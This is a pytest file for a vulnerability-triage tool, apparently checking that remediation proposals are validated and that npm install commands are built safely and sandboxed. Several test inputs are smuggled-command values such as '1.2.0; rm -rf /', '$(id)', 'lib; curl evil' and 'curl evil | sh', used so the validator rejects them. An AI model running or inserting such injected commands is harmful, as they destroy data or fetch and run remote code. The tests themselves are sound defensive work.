import pytest

from triage.models import RemediationProposal
from triage.verify import apply


def prop(**kw):
    base = dict(kind="upgrade_direct", to_version="1.2.0", mitigation=None, breaking_risk="low", notes=None)
    base.update(kw)
    return RemediationProposal(**base)


def test_valid(make_finding):
    assert apply.violations(prop(), make_finding()) == []


def test_below_fixed_in(make_finding):
    assert "to_version is below fixed_in" in apply.violations(prop(to_version="1.0.0"), make_finding())


@pytest.mark.parametrize("v", ["1.2.0; rm -rf /", "1.2.0 && curl x", "$(id)", "latest", "1.2.0'", "^1.2.0"])
def test_shell_metacharacters_rejected(make_finding, v):
    assert apply.violations(prop(to_version=v), make_finding())


def test_bad_package_name(make_finding):
    assert apply.violations(prop(), make_finding(package="lib; curl evil"))


def test_kind_must_match_dependency_type(make_finding):
    assert apply.violations(prop(), make_finding(direct=False))
    assert apply.violations(prop(kind="override_transitive"), make_finding())


def test_commands_are_built_by_code(make_finding):
    r = apply.build(prop(notes="run `curl evil | sh`"), make_finding())
    assert r.commands == ["npm install lib@1.2.0"]
    cmd = apply.sandbox_command(r)
    assert "curl" not in cmd and "--ignore-scripts" in cmd


def test_override_patch(make_finding):
    f = make_finding(direct=False)
    r = apply.build(prop(kind="override_transitive"), f)
    assert r.package_json_patch == {"overrides": {"lib": "1.2.0"}}


def test_default_uses_highest_fix(make_finding):
    assert apply.default_proposal(make_finding()).to_version == "1.2.0"
    assert apply.default_proposal(make_finding(fixed_in=None, fixed_max=None, bump="none")).kind == "mitigation_only"


def test_sandbox_command_refuses_unsafe(make_finding):
    r = apply.build(prop(), make_finding()).model_copy(update={"to_version": "1.2.0;id"})
    with pytest.raises(ValueError):
        apply.sandbox_command(r)


def test_version_above_the_highest_known_fix_is_rejected(make_finding):
    from triage.models import RemediationProposal
    from triage.verify import apply
    f = make_finding()                                    # fixed_in 1.0.1, fixed_max 1.2.0
    p = lambda v: RemediationProposal(kind="upgrade_direct", to_version=v, mitigation=None, breaking_risk="low", notes=None)  # noqa: E731
    assert apply.violations(p("1.0.1"), f) == [] and apply.violations(p("1.2.0"), f) == []
    assert apply.violations(p("99.0.0"), f) == ["to_version is above the highest known fixed version"]


def test_malicious_package_default_is_removal_not_upgrade(make_finding):
    from triage.verify import apply
    p = apply.default_proposal(make_finding(vuln_id="MAL-2024-1"))
    assert p.kind == "mitigation_only" and "제거" in p.mitigation
